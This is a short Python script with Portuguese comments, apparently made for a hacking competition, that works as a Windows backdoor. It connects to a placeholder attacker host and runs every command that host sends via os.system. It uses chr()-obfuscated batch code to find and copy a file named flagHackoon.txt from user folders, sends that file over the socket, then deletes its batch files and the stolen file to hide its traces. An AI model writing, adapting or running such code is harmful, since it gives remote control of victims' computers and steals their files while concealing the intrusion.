import socket
import os
import sys
import glob
import random
HOST = ###    INSIRA O IP DO HOST AQUI    ###    # Endereco IP do Servidor
PORT = ###   INSIRA A PORTA DO HOST AQUI   ###    # Porta que o Servidor está
tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
dest = (HOST, PORT)
tcp.connect(dest)

fileBat = open("jorge.bat", "wb");
fileBat.write(str.encode("FOR /F "+ chr(34) +"tokens=*"+ chr(34) +" "+ chr(37) + chr(37) +"B IN ('cd') DO SET VARB="+ chr(34) +""+ chr(37) + chr(37) +"B"+ chr(34) +" && cd \\Users && FOR /F "+ chr(34) +"tokens=*"+ chr(34) +" "+ chr(37) + chr(37) +"A IN ('dir /s /b flagHackoon.txt') DO SET VARA="+ chr(34) +""+ chr(37) + chr(37) +"A"+ chr(34) +" && copy "+ chr(37) +"VARA"+ chr(37) +" "+ chr(37) +"VARB"+ chr(37) +" && cd "+ chr(37) +"VARB"+ chr(37) +"\ncd "+ chr(37) +"VARB"+ chr(37) +" && FOR /F "+ chr(34) +"tokens=*"+ chr(34) +" "+ chr(37) + chr(37) +"B IN ('cd') DO SET VARB="+ chr(34) +""+ chr(37) + chr(37) +"B"+ chr(34) +" && cd \\Users && FOR /F "+ chr(34) +"tokens=*"+ chr(34) +" "+ chr(37) + chr(37) +"A IN ('dir /s /b flagHackoon.txt') DO SET VARA="+ chr(34) +""+ chr(37) + chr(37) +"A"+ chr(34) +" && copy "+ chr(37) +"VARA"+ chr(37) +" "+ chr(37) +"VARB"+ chr(37) +" && cd "+ chr(37) +"VARB"+ chr(37) +"\nexit"))
fileBat.close()

os.system('START /MIN jorge.bat')

msg = tcp.recv(1024)

while msg.decode() != 'exit':
	os.system(msg.decode())
	msg = tcp.recv(1024)

scripts = glob.glob('flagHackoon.txt')
if len(scripts) > 0:
	file = open(scripts[random.randint(0, len(scripts) - 1)], "rb")
	sendData = file.read(8192)
	while sendData:
		tcp.send(sendData)
		sendData = file.read(8192)

tcp.close()

fileDel = open("delet.bat", "wb");
fileDel.write(str.encode("del jorge.bat\ndel flagHackoon.txt\ndel delet.bat && exit"))
fileDel.close()

os.system('START /MIN delet.bat')
